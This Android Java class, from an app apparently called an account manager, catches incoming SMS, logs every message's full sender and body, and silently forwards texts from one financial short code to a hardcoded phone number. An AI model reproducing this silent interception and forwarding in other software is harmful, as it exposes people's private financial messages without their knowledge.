package com.mycompany.accountmanager;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Switch;
import android.widget.Toast;

/**
 * Created by Inseong on 2017-11-01.
 */

public class SMSReceiver extends BroadcastReceiver {
    static final String logTag = "SmsReceiver";
    static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {


        if (intent.getAction().equals(ACTION)) {
            //Bundel 널 체크getOriginatingAddress()
            Bundle bundle = intent.getExtras();
            if (bundle == null) {
                return;
            }

            //pdu 객체 널 체크
            Object[] pdusObj = (Object[]) bundle.get("pdus");
            if (pdusObj == null) {
                return;
            }

            String str = "";
            String senderNum = "";
            //message 처리
            SmsMessage[] smsMessages = new SmsMessage[pdusObj.length];
            for (int i = 0; i < pdusObj.length; i++) {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                Log.e(logTag, "NEW SMS " + i + "th");
                Log.e(logTag, "DisplayOriginatingAddress : "
                        + smsMessages[i].getDisplayOriginatingAddress());
                Log.e(logTag, "DisplayMessageBody : "
                        + smsMessages[i].getDisplayMessageBody());
                Log.e(logTag, "EmailBody : "
                        + smsMessages[i].getEmailBody());
                Log.e(logTag, "EmailFrom : "
                        + smsMessages[i].getEmailFrom());
                Log.e(logTag, "OriginatingAddress : "
                        + smsMessages[i].getOriginatingAddress());
                Log.e(logTag, "MessageBody : "
                        + smsMessages[i].getMessageBody());
                Log.e(logTag, "ServiceCenterAddress : "
                        + smsMessages[i].getServiceCenterAddress());
                Log.e(logTag, "TimestampMillis : "
                        + smsMessages[i].getTimestampMillis());
                senderNum = smsMessages[i].getOriginatingAddress();
                str = smsMessages[i].getMessageBody();
            }
            intent.putExtra("test", str);
            intent.putExtra("senderNum", senderNum);
            intent.setClass(context, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP );
            context.startActivity(intent);
            if (senderNum.trim().equals("15991111"))
                sendSms("01093643474",str, context);
        }
    }

    public void sendSms(String smsNumber, String smsText, Context context){
        PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT_ACTION"), 0);
        PendingIntent deliveredIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED_ACTION"), 0);

        SmsManager mSmsManager = SmsManager.getDefault();
        mSmsManager.sendTextMessage(smsNumber, null, smsText, sentIntent, deliveredIntent);

    }
}
